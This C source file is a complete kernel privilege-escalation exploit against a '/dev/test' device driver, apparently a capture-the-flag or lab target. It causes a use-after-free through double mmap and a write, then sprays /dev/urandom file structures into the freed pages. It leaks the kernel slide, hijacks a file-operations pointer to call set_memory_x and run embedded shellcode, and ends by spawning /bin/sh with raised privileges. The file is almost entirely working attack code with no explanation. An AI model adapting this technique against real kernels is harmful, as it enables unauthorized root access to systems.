#define _GNU_SOURCE
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/fcntl.h>
#include <sys/mman.h>
#include <unistd.h>

#define CHECK(x) ({ errno = 0; typeof(x) __x = (x); if(errno) { perror(#x); exit(1); } __x; })

int main() {
    char buf[4096];
    memset(buf, 0xcc, 4096);
    int fd = CHECK(open("/dev/test", O_RDWR));
    int fd2 = CHECK(open("/dev/test", O_RDWR));

    // mmap twice to set backing_vm to file 2
    unsigned char *a = CHECK(mmap(0, 0x3000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED, fd, 0));
    CHECK(mmap(0, 0x3000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED, fd2, 0));

    // write 0x701-length b to cause write to free all pages
    memset(a, 0x0, 0x3000);
    memset(a + 0x1000, 0xcc, 0x1000);
    CHECK(write(fd, "a", 1));

    // spray file structures into freed pages
    int fds[0x100];
    for(int i=0; i<0x100; i++) {
        fds[i] = CHECK(open("/dev/urandom", O_RDONLY));
    }

    // look for page-aligned file structure for overwrite
    unsigned long *ax = (unsigned long *)a;
    for(int i=0; i<0x3000; i+=8) {
        printf("%04x: 0x%lx\n", i >> 3, ax[i >> 3]);
    }
    unsigned long file_base = 0;
    unsigned long *file_ax = 0;
    unsigned long kernel_slide = 0;
    for(int i=0; i<0x3000; i+=0x1000) {
        if(ax[i + 0x30 >> 3] == ax[i + 0x38 >> 3] && (ax[i + 0x30 >> 3] & 0xfff) == 0x30 && (ax[i + 0xb0 >> 3] & 0xfffff) == 0x91700) {
            file_base = ax[i + 0x30 >> 3] - 0x30;
            file_ax = &ax[i >> 3];
            kernel_slide = ax[i + 0xb0 >> 3] - 0x2291700L;
            break;
        }
    }
    if(!file_base) {
        printf("oops\n");
        return 1;
    }
    printf("file_base = %lx, kernel_slide = %lx\n", file_base, kernel_slide);

    // disable read and see which fd fails to read
    file_ax[0x10 >> 3] &= ~(1L << 32);
    int goodfd = -1;
    for(int i=0; i<0x100; i++) {
        if(read(fds[i], buf, 1) < 0) {
            printf("fd %d: %s\n", fds[i], strerror(errno));
            goodfd = fds[i];
            break;
        }
    }
    if(goodfd == -1) {
        printf("oops2\n");
        return 1;
    }
    printf("good fd = %d\n", goodfd);

    // treat space after the file as scratch space
    char backup[0x100];
    memcpy(backup, &file_ax[0x100 >> 3], 0x100);
    file_ax[0x108 >> 3] = 0x107b800L + kernel_slide; // set_memory_x
    file_ax[0xb0 >> 3] = file_base + 0x100L;
    lseek64(goodfd, 1, SEEK_SET);

    // shellcode exec
    file_ax[0x108 >> 3] = file_base + 0x110L;
    const char shellcode[] = "SH\213\35\36\0\0\0H\215\273\200\311\240\2H\215\203\0\304\v\1\377\320H\211\307H\215\203p\301\v\1\377\320[\303AAAAAAAA";
    memcpy(&file_ax[0x110 >> 3], shellcode, sizeof(shellcode));
    memcpy((char *)&file_ax[0x110 >> 3] + sizeof(shellcode) - 9, &kernel_slide, 8);
    printf("executing shellcode!\n");
    lseek64(goodfd, 1, SEEK_SET);
    printf("good to go!\n");
    file_ax[0xb0 >> 3] = 0x2291700L + kernel_slide; // restore fops 

    system("/bin/sh");
}
